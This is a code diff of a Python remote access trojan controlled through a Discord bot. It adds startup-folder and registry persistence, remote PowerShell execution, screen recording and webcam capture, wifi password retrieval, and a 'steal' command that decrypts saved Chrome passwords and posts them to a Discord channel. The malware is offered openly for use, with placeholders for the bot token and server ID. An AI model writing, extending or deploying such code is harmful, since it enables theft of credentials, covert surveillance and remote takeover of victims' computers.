@@ -17,21 +17,21 @@ import win32crypt
 import subprocess
 import numpy as np
 import winreg as reg
-from Crypto.Cipher import AES
 from datetime import datetime
+from Crypto.Cipher import AES
 from discord.ext import commands
 from win32crypt import CryptUnprotectData
 
 # Constants
 TOKEN = "TOKEN" # Discord bot token
 USERNAME = os.getenv("USERNAME")  # Windows username
-GUILD_ID = 0000000000000000000000000  # Replace with your actual server ID (Interger)
+GUILD_ID = 000000000000  # Replace with your actual server ID (Interger)
 
 # Vars for bot
 intents = discord.Intents.default()
 intents.messages = True
-intents.message_content = True # Allow bot to read messages from discord channel
 intents.guilds = True # Enables interaction with discord server
+intents.message_content = True # Allow bot to read messages from discord channel
 bot = commands.Bot(command_prefix='!', intents=intents) # Bot prefix
 
 #start check vars
@@ -48,10 +48,10 @@ def get_ip_address():
     # Function to get the local machine's IP address
     # Note! it gets private ip make it so it will also get public
     try:
-        hostname = socket.gethostname() # Get the hostname of the machine
+        hostname = socket.gethostname() # Get machien hostname
         ip_address = socket.gethostbyname(hostname) # Get the IP address associated with the hostname
         return ip_address
-    except Exception as e: # error handling for the get_ip_address function
+    except Exception as e:
         return f"Error getting IP address: {e}"
 
 def get_mac_address():
@@ -60,24 +60,24 @@ def get_mac_address():
         # Getting mac-address using the uuid lib
         mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1])
         return mac
-    except Exception as e: # error handling for getting the mac-address
+    except Exception as e:
         return f"Error getting MAC address: {e}"
 
 def copy_to_start(program_to_copy):
     global startup_folder_flag_A
     global startup_folder_flag_C
     try:
-        a_users = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-        c_user = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-        os.makedirs(a_users, exist_ok=True)
-        os.makedirs(c_user, exist_ok=True)
-        try:
+        a_users = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup") # Startup folder path - all users
+        c_user = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup") # Startup path - current users
+        os.makedirs(a_users, exist_ok=True) # Create dir if not exist else keep running witout raising a error
+        os.makedirs(c_user, exist_ok=True) # Create dir if not exist else keep running witout raising a error
+        try: #Copy to all users
             shutil.copy2(program_to_copy, a_users)
             print(f"Successfully copied to: {a_users}")
             startup_folder_flag_A = True
         except Exception as e:
             print("All user error:", e)
-        try:
+        try: # Copy only for current user
             shutil.copy2(program_to_copy, c_user)
             print(f"Successfully copied to: {c_user}")
             startup_folder_flag_C = True
@@ -88,6 +88,7 @@ def copy_to_start(program_to_copy):
         print(f"There has been an error:\n{e}")
 
 def add_to_register(program_path):
+    a_users = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
     c_user = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
     program_name = os.path.basename(program_path)
     global register_flag_A
@@ -102,9 +103,9 @@ def add_to_register(program_path):
             register_flag_C = True
         except Exception as e:
             print(e)
-        try: # all user
+        try: # all users
             register_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key, 0, reg.KEY_SET_VALUE)
-            reg.SetValueEx(register_key, program_name, 0, reg.REG_SZ, c_user)
+            reg.SetValueEx(register_key, program_name, 0, reg.REG_SZ, a_users)
             print(f"Program is added to register: {program_name}")
             reg.CloseKey(register_key)
             register_flag_A = True
@@ -116,43 +117,38 @@ def add_to_register(program_path):
 
 async def main_loop():
     while True:
-        print("Hallo")
+        print("loop")
         await asyncio.sleep(5)
 
 async def record_screen(ctx, rec: bool):
     try:
-        # Define the output file name with a timestamp
+        # Define output name by timestamp
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         output_file = f"screen_recording_{timestamp}.mp4"
 
-        # Record the screen continuously in a loop until rec is False
+        # Record the screen in a loop until rec is False
         fps = 12  # Frames per second
-        duration = 3  # Duration in seconds
+        duration = 5  # Duration in seconds
         frames = []
 
         while rec:  # Loop to keep recording as long as rec is True
-            frames.clear()  # Clear the frames list for the next batch of frames
-
+            frames.clear()  # Clear the frames from last recording
             for _ in range(fps * duration):
                 if not rec:
                     break
-
                 screenshot = pyautogui.screenshot()
                 # Convert the screenshot to a numpy array
                 frame = np.array(screenshot)
                 frames.append(frame)
                 await asyncio.sleep(1 / fps)
-
             if frames:
                 # Save frames as a video using imageio
                 with imageio.get_writer(output_file, fps=fps) as writer:
                     for frame in frames:
                         writer.append_data(frame)
-
                 # Send the recorded video to Discord
                 with open(output_file, "rb") as video_file:
                     await ctx.send(file=discord.File(video_file, output_file))
-
                 # Optional: you can clean up the recorded file after sending it
                 os.remove(output_file)
 
@@ -164,16 +160,16 @@ async def record_screen(ctx, rec: bool):
 
 @bot.command()
 async def what(ctx):
-    commands = "**whoami**-(get current user who is running at this moment)\n**send_message**-(make the bot send a message)\n**ps**-(execute powershell commands)\n**getwifipass**-(get wifi passwords)\n**getsysinfo**-(get important system info)\n**steal**-(Steals saved chrome email and passwords)\n**stopbot**-(You know what this does)"
+    commands = "**whoami**-(get current user who is running at this moment)\n**ps**-(execute powershell commands)\n**getwifipass**-(get wifi passwords)\n**steal**-(Steals saved chrome email and passwords)\n**screen** -(start|stop)\n**webcam_selfie**-(make a photo of any found webcams)\n**getsysinfo**-(get important system info)\n**echo**-(make the bot echo you)\n**stopbot**-(You know what this does)"
     await ctx.send(commands)
 
 @bot.command()
 async def whoami(ctx):
-    await ctx.send(f"I am: {USERNAME} 👋")
+    await ctx.send(f"👻I am: {USERNAME}")
 
 @bot.command()
-async def send_message(ctx, *, message: str):
-    await ctx.send(f"Sending message: {message}")
+async def echo(ctx, *, message: str):
+    await ctx.send(f" {message}")
 
 @bot.command()
 async def webcam_selfie(ctx):
@@ -197,11 +193,11 @@ async def ps(ctx, *, code: str):
         output = stdout.decode('utf-8').strip()
         error = stderr.decode('utf-8').strip()
         if output:
-            result_message = f"**Output:**\n{output}"
+            result_message = f"**👻Output:**\n{output}"
         elif error:
-            result_message = f"**Error:**\n{error}"
+            result_message = f"**❌Error:**\n{error}"
         else:
-            result_message = "No output or error from the PowerShell command."
+            result_message = "❌No output or error from the PowerShell command."
 
         # Send to bot
         await ctx.send(result_message)
@@ -211,7 +207,7 @@ async def ps(ctx, *, code: str):
 
 @bot.command()
 async def stopbot(ctx):
-    await ctx.send("Shutting down the bot...")
+    await ctx.send("❌Shutting down the bot...")
     await bot.close()
 
 @bot.command()
@@ -248,17 +244,17 @@ async def steal(ctx):
         if password_value:
             decrypted_password = decrypt_password(password_value)
             if decrypted_password:
-                await ctx.send(f"URL: {origin_url}")
-                await ctx.send(f"Username: {username_value}")
-                await ctx.send(f"Password: {decrypted_password}")
+                await ctx.send(f"✅URL: {origin_url}")
+                await ctx.send(f"✅Username: {username_value}")
+                await ctx.send(f"✅Password: {decrypted_password}")
             else:
-                await ctx.send(f"URL: {origin_url}")
-                await ctx.send(f"Username: {username_value}")
-                await ctx.send(f"Password: Unable to decrypt: {password_value}")
+                await ctx.send(f"❌URL: {origin_url}")
+                await ctx.send(f"❌Username: {username_value}")
+                await ctx.send(f"❌Password: Unable to decrypt: {password_value}")
         else:
-            await ctx.send(f"URL: {origin_url}")
-            await ctx.send(f"Username: {username_value}")
-            await ctx.send(f"Password: [Encrypted]: {password_value}")
+            await ctx.send(f"❌URL: {origin_url}")
+            await ctx.send(f"❌Username: {username_value}")
+            await ctx.send(f"❌Password: [Encrypted]: {password_value}")
 
     conn.close()
     os.remove(temp_db_path)
@@ -361,7 +357,7 @@ async def on_ready():
         channel = await guild.create_text_channel(f"{USERNAME}")
         print(f"✅ Created channel: {channel.name}")
 
-    await channel.send(f"👻{USERNAME} is online ✅")
+    await channel.send(f"👻{USERNAME} is online 🖥️")
 
     #Start up flag debug
     if startup_folder_flag_A or startup_folder_flag_C or register_flag_A or register_flag_C:
@@ -402,7 +398,7 @@ async def on_ready():
  |   |   |    | /    ~    |    __)_                                  |   | 
  |   |   |    | \    Y    |        \                                 |   | 
  |   |   |____|  \___|_  /_______  /                                 |   | 
- |   |                 \/        \/              👻                  |   | 
+ |   |                 \/        \/              👻                 |   | 
  |   |   ________  ___ ___ ________    ___________________           |   | 
  |   |  /  _____/ /   |   \\_____  \  /   _____\__    ___/           |   | 
  |   | /   \  ___/    ~    \/   |   \ \_____  \  |    |              |   | 
